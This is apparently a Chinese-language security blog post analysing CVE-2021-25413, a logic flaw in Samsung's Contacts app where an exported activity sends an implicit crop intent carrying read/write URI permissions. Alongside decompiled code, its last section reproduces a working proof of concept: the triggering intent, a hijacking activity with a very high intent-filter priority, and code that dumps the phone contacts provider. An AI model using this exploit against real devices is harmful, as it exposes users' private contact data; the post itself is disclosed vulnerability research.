---
layout: post
title:  "[CVE-2021-25413] [Samsung] [Contacts] 组件SetProfilePhotoActivity导出存在任意私有组件启动漏洞可获取ContentProvider数据"
date:   2022-11-20 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

|    Date    | Version |     Description      |   Author    |
| :--------: | :-----: | :------------------: | :---------: |
| 2022.11.20 |   1.0   | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

组件`SetProfilePhotoActivity`导出，通过合理构造Intent参数可以调用方法`startActivityForResult()`，方法`startActivityForResult()`使用的Intent参数是由内部构造的，其会将外部可控的URI赋值到启动Intent内部的ClipData字段，并且标志位设置为读写权限，漏洞点在于该构造出来的Intent是隐式Intent，未指定具体的接收组件，所以只需要制定一个高优先级满足ACTION配置的Activity，即可实现访问ContentProvider数据

## 0x01 触发条件

| 上线日期 |  应用名  |               包名               |   版本号   |               MD5                | 下载链接 |
| :------: | :------: | :------------------------------: | :--------: | :------------------------------: | :------: |
|          | Contacts | com.samsung.android.app.contacts | 12.1.10.30 | 60579c925977ca29b889d32085a0c350 |          |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause Analysis

组件`com.samsung.android.contacts.editor.SetProfilePhotoActivity`导出

```xml
<activity 
        android:configChanges="keyboardHidden|orientation|screenSize" 
        android:hardwareAccelerated="false" 
        android:icon="@mipmap/ic_launcher_contacts" 
        android:label="@string/share_my_profile" 
        android:name="com.samsung.android.contacts.editor.SetProfilePhotoActivity" 
        android:taskAffinity="" 
        android:theme="@style/BackgroundOnlyTheme">
    <intent-filter>
        <action android:name="android.intent.action.SEND"/>
        <data android:mimeType="image/*"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.contacts.action.SET_AS_PROFILE_PICTURE"/>
        <data android:mimeType="image/*"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```

在`SetProfilePhotoActivity`的`onCreate()`方法里，`[1]`调用方法`F8()`处理传入Intent的字段，`[2]`调用方法`H8()`进入异步任务

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity
@Override  // com.samsung.android.dialtacts.common.contactslist.e
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    SetProfilePhotoPresenter setProfilePhotoPresenter = new SetProfilePhotoPresenter(this, PhotoModelFactory.a(), s0.a());
    this.mSetProfilePhotoPresenter = setProfilePhotoPresenter;
    this.G8(setProfilePhotoPresenter);
    this.__intent_action__ = this.getIntent().getAction();
    if(!this.F8(bundle)) {  // [1]
        return;
    }

    if(!PermissionsUtil.c(this, SetProfilePhotoActivity.C)) {
        String s = this.getString(0x7F12016E);  // string:contactsList "Contacts"
        PermissionsUtil.l(this, SetProfilePhotoActivity.C, 0, s, true);
        return;
    }

    this.H8();  // [2]
}
```

方法`F8()`也有一个判断，简单构造即可绕过，`[1]`调用方法`E8()`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity
private boolean F8(Bundle bundle) {
    if(!"android.intent.action.SEND".equals(this.__intent_action__) && !"set_profile_photo".equals(this.__intent_action__) && !"com.samsung.contacts.action.SET_AS_PROFILE_PICTURE".equals(this.__intent_action__)) {
        return false;
    }

    this.E8(bundle);  // [1]
    return this.__intent_tmp_photo_uri__ == null || (new File(this.__intent_tmp_photo_uri__.getPath()).exists());
}
```

方法`E8()`取出传入Intent的两个字段`"temp_photo_uri"`和`"cropped_photo_uri"`保存到`__intent_tmp_photo_uri__`和`__intent_cropped_photo_uri__`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity
private void E8(Bundle bundle) {
    if(bundle != null && (bundle.containsKey("temp_photo_uri")) && (bundle.containsKey("cropped_photo_uri"))) {
        this.__intent_tmp_photo_uri__ = Uri.parse(bundle.getString("temp_photo_uri"));
        this.__intent_cropped_photo_uri__ = Uri.parse(bundle.getString("cropped_photo_uri"));
        return;
    }

    String __intent_temp_photo_uri__ = this.getIntent().getStringExtra("temp_photo_uri");  // [1]
    String __intent_cropped_photo_uri__ = this.getIntent().getStringExtra("cropped_photo_uri");  // [2]
    if(__intent_temp_photo_uri__ != null && __intent_cropped_photo_uri__ != null) {
        this.__intent_tmp_photo_uri__ = Uri.parse(__intent_temp_photo_uri__);
        this.__intent_cropped_photo_uri__ = Uri.parse(__intent_cropped_photo_uri__);
    }
}
```

方法`H8()`先在`[1]`调用方法`B8()`进行判断，我们不能让其进入，同样 可以构造参数使其不进入，然后`[2]`调用异步任务进行处理

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity
private boolean B8() {
    return ("com.samsung.contacts.action.SET_AS_PROFILE_PICTURE".equals(this.__intent_action__)) 
                && this.getIntent().getExtras() != null 
                && (this.getIntent().getBooleanExtra("no_crop", false));
}

// com.samsung.android.contacts.editor.SetProfilePhotoActivity
private void H8() {
    if(this.B8()) {  // [1]
        if(this.getIntent().getParcelableExtra("android.intent.extra.STREAM") != null) {
            this.z = (Uri)this.getIntent().getParcelableExtra("android.intent.extra.STREAM");
            this.mSetProfilePhotoPresenter.getProfileIntentAndStartEditor();
            return;
        }

        AppLog.m("SetProfilePhotoActivity", "Invalid intent:" + this.getIntent());
        this.finish();
        return;
    }

    a setProfilePhotoActivity$a0 = new a(this, this.D8());
    this.B = setProfilePhotoActivity$a0;
    setProfilePhotoActivity$a0.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);  // [2]
}
```

异步任务`SetProfilePhotoActivity.a`有两个具体实现的方法`doInBackground()`和`onPostExecute()`

`doInBackground()`的逻辑不影响本漏洞的分析，但是它有一个小知识点会影响人工分析

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
@Override  // android.os.AsyncTask
protected Object doInBackground(Object[] arr_object) {
    return this.a(((Void[])arr_object));  // [1]
}
```

方法`a()`调用方法`savePhotoFromUriToUri()`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
protected Void a(Void[] arr_void) {
    SetProfilePhotoActivity setProfilePhotoActivity_ = (SetProfilePhotoActivity)this.setProfilePhotoActivity0.get();
    if(setProfilePhotoActivity_ == null) {
        return null;
    }

    this.savePhotoFromUriToUri(setProfilePhotoActivity_);  // [1]
    return null;

```

`[1]`获取传入Intent的ClipData，如果不为空则调用`[2]`和`[3]`，反之如果为空，则会进入`[5]`关闭当前Activity，`[4]`可以通过构造传入Intent来绕过

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
private void savePhotoFromUriToUri(SetProfilePhotoActivity setProfilePhotoActivity) {
    Uri __uri__;
    ClipData __clipData__ = setProfilePhotoActivity.getIntent().getClipData();  // [1]
    if(__clipData__ != null && __clipData__.getItemCount() == 1 && __clipData__.getItemAt(0) != null) {
        __uri__ = __clipData__.getItemAt(0).getUri();  // [2]
        if(!this.setPhotoUri(setProfilePhotoActivity, __uri__)) {  // [3]
            return;
        }
    }
    else {
        __uri__ = null;
    }

    if(__uri__ == null) {
        if(setProfilePhotoActivity.getIntent().getExtras() != null && setProfilePhotoActivity.getIntent().getExtras().getString("shared_photo_uri", null) != null) {
            __uri__ = Uri.parse(setProfilePhotoActivity.getIntent().getExtras().getString("shared_photo_uri"));  // [4]
            goto label_48;
        }

        setProfilePhotoActivity.finish();  // [5]
        return;
    }

    try {
    label_48:
        PhotoDataUtils.S(__uri__, setProfilePhotoActivity.__intent_tmp_photo_uri__, false);  // [6]
    }
    catch(SecurityException securityException0) {
        AppLog.l("SetProfilePhotoActivity", "savePhotoFromUriToUri, SecurityException: " + securityException0.getMessage());
        setProfilePhotoActivity.finish();
        return;
    }

    if(this.imageTitleFromMediaDB == null) {
        this.imageTitleFromMediaDB = setProfilePhotoActivity.v.getImageTitleFromMediaDB(__uri__);
    }

    if(setProfilePhotoActivity.getIntent().getBooleanExtra("delete_temp_agif", false)) {
        PhotoDataUtils.h(__uri__);
    }
}
```

那此处就有一个问题，一个Activity调用了异步任务，在异步任务的生命周期里，调用者Activity被结束（比如调用方法finish()），异步任务会继续执行吗？

答案是：会继续执行下去

在方法`onPostExecute()`里，`[1]`调用方法`c()`

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
@Override  // android.os.AsyncTask
protected void onPostExecute(Object object) {
    this.c(((Void)object));  // [1]
}
```

此处即是漏洞关键点，`[1]`构造一个Intent，其中`setProfilePhotoActivity.__intent_tmp_photo_uri__`外部可控，`[2]`、`[3]`和`[4]`对Intent的类型字段进行配置，用于筛选能处理这些数据类型的Activity，`[5]`调用方法`AbstractPhotoViewUtils.c()`和`[6]`调用方法`AbstractPhotoViewUtils.b()`对Intent添加字段，其中`[5]`会添加一个外部可控的字段，`[7]`是一个简单判断，`[8]`调用方法`startActivityForResult()`打开构造好的Intent

```java
// com.samsung.android.contacts.editor.SetProfilePhotoActivity.a
protected void c(Void void0) {
    SetProfilePhotoActivity setProfilePhotoActivity = (SetProfilePhotoActivity)this.setProfilePhotoActivity0.get();
    if(setProfilePhotoActivity == null) {
        return;
    }

    Intent intent = new Intent("com.android.camera.action.CROP", setProfilePhotoActivity.__intent_tmp_photo_uri__);  // [1]
    String __intent_mimeType__ = setProfilePhotoActivity.getIntent().getStringExtra("mimeType");
    String __intent_type__ = setProfilePhotoActivity.getIntent().getType();
    if(__intent_mimeType__ != null) {
        intent.setDataAndType(setProfilePhotoActivity.__intent_tmp_photo_uri__, __intent_mimeType__);  // [2]
    }
    else if(__intent_type__ != null) {
        intent.setDataAndType(setProfilePhotoActivity.__intent_tmp_photo_uri__, __intent_type__);  // [3]
    }
    else if(!TextUtils.isEmpty(this.b) && (this.b.contains("gif"))) {
        intent.setDataAndType(setProfilePhotoActivity.__intent_tmp_photo_uri__, "image/gif");  // [4]
    }

    AbstractPhotoViewUtils.c(intent, setProfilePhotoActivity.__intent_cropped_photo_uri__, this.outputX);  // [5]
    AbstractPhotoViewUtils.b(intent, this.outputX);  // [6]
    if(setProfilePhotoActivity.v.i4(intent)) {  // [7] 查询Intent是否有响应的应用
        setProfilePhotoActivity.startActivityForResult(intent, 1);  // [8]
        return;
    }

    setProfilePhotoActivity.C8();
}
```

接下来依次分析，首先是方法`c()`，可以看到其中`"output"`字段和剪贴板数据是外部可控的，`[2]`调用方法`setFlags()`设置标志位，`3`表示`Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION`，描述接收该Intent可以获取指定URI的读写权限，`[3]`添加ClipData数据，`[4]`补充一些其它字段

```java
// com.samsung.android.contacts.editor.o.AbstractPhotoViewUtils
public static void c(Intent intent, Uri __intent_cropped_photo_uri__, int outputX) {
    intent.putExtra("crop", true);
    intent.putExtra("output", __intent_cropped_photo_uri__);  // [1]
    intent.addFlags(3);  // [2]
    intent.setClipData(ClipData.newRawUri("output", __intent_cropped_photo_uri__));  // [3]
    AbstractPhotoViewUtils.a(intent, outputX);  // [4]
}

// com.samsung.android.contacts.editor.o.AbstractPhotoViewUtils
private static void a(Intent intent, int outputX) {
    intent.putExtra("outputX-gif", outputX);
    intent.putExtra("outputY-gif", outputX);
    intent.putExtra("max-file-size", PhotoViewUtils.a);
    intent.putExtra("support-crop-gif", true);
}
```

根据AOSP开源代码注释

- https://android.googlesource.com/platform/frameworks/base/+/master/core/java/android/content/Intent.java#6602

如果同时设置了Intent的URI和ClipData，那么会同时给接收者赋予标志位所描述的权限

```java
/**
 * If set, the recipient of this Intent will be granted permission to
 * perform read operations on the URI in the Intent's data and any URIs
 * specified in its ClipData.  When applying to an Intent's ClipData,
 * all URIs as well as recursive traversals through data or other ClipData
 * in Intent items will be granted; only the grant flags of the top-level
 * Intent are used.
 */
public static final int FLAG_GRANT_READ_URI_PERMISSION = 0x00000001;
/**
 * If set, the recipient of this Intent will be granted permission to
 * perform write operations on the URI in the Intent's data and any URIs
 * specified in its ClipData.  When applying to an Intent's ClipData,
 * all URIs as well as recursive traversals through data or other ClipData
 * in Intent items will be granted; only the grant flags of the top-level
 * Intent are used.
 */
public static final int FLAG_GRANT_WRITE_URI_PERMISSION = 0x00000002;
```

方法`b()`添加的数据不影响漏洞

```java
// com.samsung.android.contacts.editor.o.AbstractPhotoViewUtils
public static void b(Intent intent, int outputX) {
    intent.putExtra("crop", "true");
    intent.putExtra("scale", true);
    intent.putExtra("scaleUpIfNeeded", true);
    intent.putExtra("aspectX", 1);
    intent.putExtra("aspectY", 1);
    intent.putExtra("outputX", outputX);
    intent.putExtra("outputY", outputX);
}
```

由于`SetProfilePhotoActivity`继承`ContactsActivity`，所以调用方法`startActivityForResult()`的时候会调用回父类的`startActivityForResult()`

```java
// com.samsung.android.dialtacts.common.contactslist.ContactsActivity
@Override  // androidx.fragment.app.l
public void startActivityForResult(Intent intent, int v) {
    try {
        super.startActivityForResult(intent, v);
    }
    catch(ActivityNotFoundException activityNotFoundException) {
        AppLog.i(this.m8(), "startActivityForResult : " + activityNotFoundException.toString());
    }
}
```

从以上Intent构造过程来看，这个Intent并没有指定具体的接收组件，也就是说它是一个隐式Intent，只要满足条件的Activity都能够接收到，加上它的标志位是读写，所以定制一个高优先级且满足ACTION设置的Activity，就可以拦截到这个Intent并拥有其传递出来的权限

![逻辑调用图](/assets/resources/4D2A2539A3EE1FADFE1F0260B9C87E87.svg)

## 0x05 调试与利用

关于异步任务与Activity生命周期的问题可以写个应用验证，在方法`doInBackground()`里关闭Activity，观察异步任务是否会继续执行方法`onPostExecute()`

```java
public class MainActivity extends AppCompatActivity {
    final private static String TAG = String.format("[*] [%s]", MainActivity.class.getName());

    class MyAsyncTask extends AsyncTask {
        private MainActivity mMainActivity;

        public MyAsyncTask(MainActivity mainActivity) {
            this.mMainActivity = mainActivity;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
            Log.e(TAG, "onPreExecute: ");
        }

        @Override
        protected Object doInBackground(Object[] objects) {
            Log.e(TAG, "doInBackground: ");
            this.mMainActivity.finish();
            return null;
        }

        @Override
        protected void onPostExecute(Object o) {
            super.onPostExecute(o);
            Log.e(TAG, "onPostExecute: ");
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Log.e(TAG, "onCreate: " + getIntent().toUri(Intent.URI_INTENT_SCHEME));
        MyAsyncTask myAsyncTask = new MyAsyncTask(this);
        myAsyncTask.executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR, new Void[0]);
    }
    
    @Override
    public void finish() {
        super.finish();
        Log.e(TAG, "finish: ");
    }
}
```

从日志输出去我们可以确认，当Activity被关闭之后，后续的方法`onPostExecute()`依旧会正常执行下去

```shell
[*] [com.wnagzih...ty.MainActivity] com.wnagzihxa1n.exploit.startactivity          E  onCreate: intent:#Intent;action=android.intent.action.MAIN;category=android.intent.category.LAUNCHER;launchFlags=0x10000000;component=com.wnagzihxa1n.exploit.startactivity/.MainActivity;end
[*] [com.wnagzih...ty.MainActivity] com.wnagzihxa1n.exploit.startactivity          E  onPreExecute: 
[*] [com.wnagzih...ty.MainActivity] com.wnagzihxa1n.exploit.startactivity          E  doInBackground: 
[*] [com.wnagzih...ty.MainActivity] com.wnagzihxa1n.exploit.startactivity          E  finish: 
[*] [com.wnagzih...ty.MainActivity] com.wnagzihxa1n.exploit.startactivity          E  onPostExecute:
```

Oversecured实验室的PoC如下

```java
Intent i = new Intent(Intent.ACTION_SEND);
i.setClassName("com.samsung.android.app.contacts", "com.samsung.android.contacts.editor.SetProfilePhotoActivity");
i.putExtra("temp_photo_uri", "/");
i.putExtra("cropped_photo_uri", ContactsContract.CommonDataKinds.Phone.CONTENT_URI.toString());
i.putExtra("mimeType", "test/1337");
startActivity(i);
```

作为`startActivityForResult()`的接收者，获取剪贴板数据进行读取，漏洞分析的时候有解释，剪贴板包含的URI也会被授予标志位所描述的权限

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    if ("com.android.camera.action.CROP".equals(getIntent().getAction())) {
        dump(getIntent().getClipData().getItemAt(0).getUri());
    }

    finish();
}

public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if(sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

Manifest里要将`PickerActivity`配置成高优先级，可以优先响应到Intent

```xml
<activity android:name=".PickerActivity">
    <intent-filter android:autoVerify="true" android:priority="999999999">
        <action android:name="com.android.camera.action.CROP" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:mimeType="*/*" />
        <data android:mimeType="image/*" />
        <data android:mimeType="test/1337" />
    </intent-filter>
</activity>
```

## 0x06 漏洞研究

## 0x07 References

《Two weeks of securing Samsung devices: Part 2》

- https://blog.oversecured.com/Two-weeks-of-securing-Samsung-devices-Part-2/

## 附录：调试过程记录

